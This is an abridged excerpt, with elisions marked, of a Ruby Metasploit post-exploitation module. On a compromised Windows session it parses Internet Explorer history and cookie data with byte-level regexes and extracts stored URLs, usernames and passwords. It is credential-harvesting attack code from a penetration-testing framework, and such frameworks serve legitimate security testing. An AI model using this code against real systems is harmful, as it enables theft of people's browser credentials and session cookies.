...
class MetasploitModule < Msf::Post
  ...
  def is_86
    ...
    session.sys.process.each_process.find { |i| i["pid"] == pid } ["arch"] == "x86"
  end
  ...
  def get_stuff(path, history)
    ...
    tmpout = ""
    re = if history
           /\x55\x52\x4C\x20.{4}(.{8})(.{8}).*?\x56\x69\x73\x69\x74\x65\x64\x3A.*?\x40(.*?)\x00/m
         else # get cookies
           /\x55\x52\x4C\x20.{4}(.{8})(.{8}).*?\x43\x6F\x6F\x6B\x69\x65\x3A(.*?)\x00/m
         end
    ...
    if val_arr
      @hist_col.each do |hitem|
        ...
        for i in (0..cnt).step(2)
          ...
          cred["url"] = url
          cred["user"] = secrets[i].delete("\x00")
          cred["pass"] = secrets[i + 1].delete("\x00") unless secrets[i + 1].nil?
